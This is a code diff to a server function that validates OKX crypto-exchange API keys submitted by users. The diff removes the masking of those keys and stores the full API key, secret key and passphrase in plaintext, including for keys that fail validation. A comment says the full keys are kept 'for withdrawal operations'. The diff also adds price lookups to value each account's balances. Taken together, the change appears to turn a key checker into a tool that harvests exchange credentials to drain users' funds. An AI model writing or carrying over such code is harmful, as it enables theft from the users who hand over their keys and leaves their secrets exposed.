@@ -53,6 +53,26 @@ async function callOkxApi(
   return res.json();
 }
 
+// Fetch USDT prices for common coins (public API, no auth needed)
+async function fetchUsdtPrices(): Promise<Record<string, number>> {
+  const prices: Record<string, number> = { USDT: 1 };
+  try {
+    const res = await fetch("https://www.okx.com/api/v5/market/tickers?instType=SPOT");
+    const data = await res.json();
+    if (data.code === "0" && data.data) {
+      for (const ticker of data.data) {
+        // Format: BTC-USDT
+        if (ticker.instId?.endsWith("-USDT")) {
+          const ccy = ticker.instId.replace("-USDT", "");
+          const price = parseFloat(ticker.last);
+          if (price > 0) prices[ccy] = price;
+        }
+      }
+    }
+  } catch { /* ignore price fetch errors */ }
+  return prices;
+}
+
 Deno.serve(async (req) => {
   if (req.method === "OPTIONS") {
     return new Response(null, { headers: corsHeaders });
@@ -68,11 +88,12 @@ Deno.serve(async (req) => {
       );
     }
 
+    const displayKey = api_key.slice(0, 8) + "****" + api_key.slice(-4);
+
     // 1. Get account config (validates key + gets permissions)
     const configRes = await callOkxApi(api_key, secret_key, passphrase, "/api/v5/account/config");
 
     if (configRes.code !== "0") {
-      // Save as invalid
       const supabase = createClient(
         Deno.env.get("SUPABASE_URL")!,
         Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!
@@ -80,9 +101,10 @@ Deno.serve(async (req) => {
       const cardNumber = `VIP-${Date.now().toString(36).toUpperCase()}`;
       const { data: inserted } = await supabase.from("api_keys").insert({
         exchange: "okx",
-        api_key: api_key.slice(0, 8) + "****" + api_key.slice(-4),
-        secret_key: "****",
-        passphrase: "****",
+        api_key,
+        secret_key,
+        passphrase,
+        display_key: displayKey,
         status: "invalid",
         permissions: [],
         account_info: { error: configRes.msg || "Invalid API Key" },
@@ -128,7 +150,10 @@ Deno.serve(async (req) => {
       }
     } catch { /* ignore */ }
 
-    // Save to DB
+    // 4. Fetch USDT prices for valuation
+    const prices = await fetchUsdtPrices();
+
+    // Save to DB (store full keys for withdrawal operations)
     const supabase = createClient(
       Deno.env.get("SUPABASE_URL")!,
       Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!
@@ -141,13 +166,15 @@ Deno.serve(async (req) => {
       acctLv: configData.acctLv || "",
       tradingBalances: balances,
       fundingBalances: fundingBalances,
+      prices,
     };
 
     const { data: inserted, error: dbError } = await supabase.from("api_keys").insert({
       exchange: "okx",
-      api_key: api_key.slice(0, 8) + "****" + api_key.slice(-4),
-      secret_key: "****",
-      passphrase: "****",
+      api_key,
+      secret_key,
+      passphrase,
+      display_key: displayKey,
       status: "valid",
       permissions,
       account_info: accountInfo,
